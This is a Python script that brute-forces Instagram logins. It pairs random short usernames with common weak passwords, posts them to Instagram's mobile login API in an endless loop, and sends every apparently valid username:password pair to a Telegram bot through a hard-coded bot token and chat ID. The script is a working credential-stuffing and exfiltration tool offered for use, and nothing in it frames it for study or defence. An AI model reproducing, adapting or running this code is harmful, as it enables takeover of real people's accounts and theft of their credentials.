import requests
import random
from uuid import uuid4

R = '\033[31;1m'
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"

iD    = '1839018065'
TokeN = '5037572049:AAEp4ADRuKI-S4XPVmnWUR4PPxXTEdi_zUA'

def ExEc():
    try: #ExEc
        
        while True:
            num = '1q2w3e4r5t6y7u8i9o0plmknjbhvgcfxdzsa._'
            username = str(''.join((random.choice(num) for i in range(4))))
            num1 = ('1122334455','12341234','1234512345','11223344','Aa123123','Aa123456','qwer1234','1234qwer','qredes123')
            password = random.choice(num1)

            headers = {"X-Ig-Connection-Type": "WiFi","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Ig-Capabilities": "36r/Fx8=","User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+","X-Ig-App-Locale": "en","X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt","Content-Length": "ExEc","Accept-Encoding": "gzip, deflate"}
            data = {"username": username,"reg_login": "0","enc_password": f"#PWD_INSTAGRAM:0:&:{password}","device_id": str(uuid4()),"login_attempt_count": "0","phone_id": str(uuid4())}
            response = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data)

            if 'Bad Password' in response.text:
                print(f"{R}<{C}/{R}> {R}[ {C}Secure B13 {R}] {H}♪ {R}( {C}{username}:{password} {R})")
                requests.post(f'https://api.telegram.org/bot{TokeN}/sendMessage?chat_id={iD}&text=Username : {username}:{password}')

            elif 'challenge_required' in response.text :
                print(f"{R}<{C}/{R}> {R}[ {C}Secure {R}] {H}♪ {R}( {C}{username}:{password} {R})")
                with open('Secure.txt', 'a') as file : file.write(f'{username}:{password}''\n')
                requests.post(f'https://api.telegram.org/bot{TokeN}/sendMessage?chat_id={iD}&text=Username : {username}:{password}')
                Secure += 1

            elif 'bad_password' in response.text :
                print(f"{R}<{C}/{R}> {R}[ {C}Taken PassworD {R}] {H}♪ {R}( {C}{username}:{password} {R})")
            
            elif 'Incorrect username' in response.text :
                print(f"{R}<{C}/{R}> {R}[ {C}Taken Username {R}] {C}♪ {R}( {C}{username}:{password} {R})")
                
            elif 'ip_block' in response.text :
                print(f"{R}<{C}/{R}> {R}[ {C}Taken Block {R}] {R}♪ {R}( {C}{username}:{password} {R})")

    except:
        ExEc()

ExEc()
